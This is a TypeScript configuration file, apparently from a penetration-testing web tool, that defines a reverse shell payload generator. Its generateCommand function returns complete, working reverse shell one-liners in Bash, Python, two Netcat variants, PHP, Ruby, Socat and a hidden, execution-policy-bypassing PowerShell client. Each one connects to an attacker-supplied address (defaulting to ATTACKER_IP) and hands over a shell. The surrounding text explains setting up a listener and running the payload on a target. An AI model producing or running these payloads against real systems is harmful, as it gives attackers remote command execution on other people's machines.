import type { GeneratorConfig } from '../../types/generator';

export const reverseShellGenerator: GeneratorConfig = {
  id: 'reverse-shell',
  name: 'Reverse Shell Generator',
  description: 'Generate various reverse shell payloads (Bash, Python, Netcat, PowerShell) for penetration testing.',
  categoryId: 'exploitation',
  exampleUsage: 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1',
  explanation: 'A reverse shell is a connection that originates from the target machine back to your attacking machine. You need to setup a listener (e.g. nc -lvnp 4444) on your machine first, then execute this payload on the target to grant yourself command line access.',
  fields: [
    {
      id: 'ip',
      label: 'Your IP Address (LHOST)',
      type: 'text',
      placeholder: '10.10.10.10',
      required: true,
      defaultValue: '',
      description: 'The IP address of your listener.'
    },
    {
      id: 'port',
      label: 'Your Port (LPORT)',
      type: 'number',
      placeholder: '4444',
      required: true,
      defaultValue: 4444,
      description: 'The port your listener is running on.'
    },
    {
      id: 'type',
      label: 'Payload Type',
      type: 'select',
      options: [
        { label: 'Bash', value: 'bash' },
        { label: 'Python 3', value: 'python' },
        { label: 'Netcat (Traditional)', value: 'nc_traditional' },
        { label: 'Netcat (OpenBSD)', value: 'nc_openbsd' },
        { label: 'PHP', value: 'php' },
        { label: 'Ruby', value: 'ruby' },
        { label: 'Socat', value: 'socat' },
        { label: 'PowerShell', value: 'powershell' }
      ],
      defaultValue: 'bash',
      description: 'The type of reverse shell payload.'
    },
    {
      id: 'shell',
      label: 'Shell Type',
      type: 'select',
      options: [
        { label: '/bin/sh', value: '/bin/sh' },
        { label: '/bin/bash', value: '/bin/bash' }
      ],
      defaultValue: '/bin/sh',
      description: 'The shell to execute on the target.'
    }
  ],
  generateCommand: (values: any) => {
    const { type, ip, port, shell } = values;
    const targetIp = ip || 'ATTACKER_IP';
    const targetPort = port || '4444';
    const targetShell = shell || '/bin/sh';

    switch (type) {
      case 'bash':
        return `bash -i >& /dev/tcp/${targetIp}/${targetPort} 0>&1`;
      case 'python':
        return `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${targetIp}",${targetPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("${targetShell}")'`;
      case 'nc_traditional':
        return `nc -e ${targetShell} ${targetIp} ${targetPort}`;
      case 'nc_openbsd':
        return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${targetShell} -i 2>&1|nc ${targetIp} ${targetPort} >/tmp/f`;
      case 'php':
        return `php -r '$sock=fsockopen("${targetIp}",${targetPort});exec("${targetShell} -i <&3 >&3 2>&3");'`;
      case 'ruby':
        return `ruby -rsocket -e'f=TCPSocket.open("${targetIp}",${targetPort}).to_i;exec sprintf("${targetShell} -i <&%d >&%d 2>&%d",f,f,f)'`;
      case 'socat':
        return `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${targetIp}:${targetPort}`;
      case 'powershell':
        return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient("${targetIp}",${targetPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      default:
        return 'Select a payload type';
    }
  },
  seo: {
    title: 'Reverse Shell Command Generator - Bash, Python, PHP & More',
    description: 'Generate reverse shell one-liners for various languages and environments. Quick access to reliable payloads for penetration testing.',
    keywords: ['reverse shell generator', 'bash reverse shell', 'python reverse shell', 'php reverse shell', 'one-liner shells']
  },
  additionalContent: [
    {
      title: 'What is a Reverse Shell?',
      content: `A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which allows for remote command execution.`
    }
  ]
};
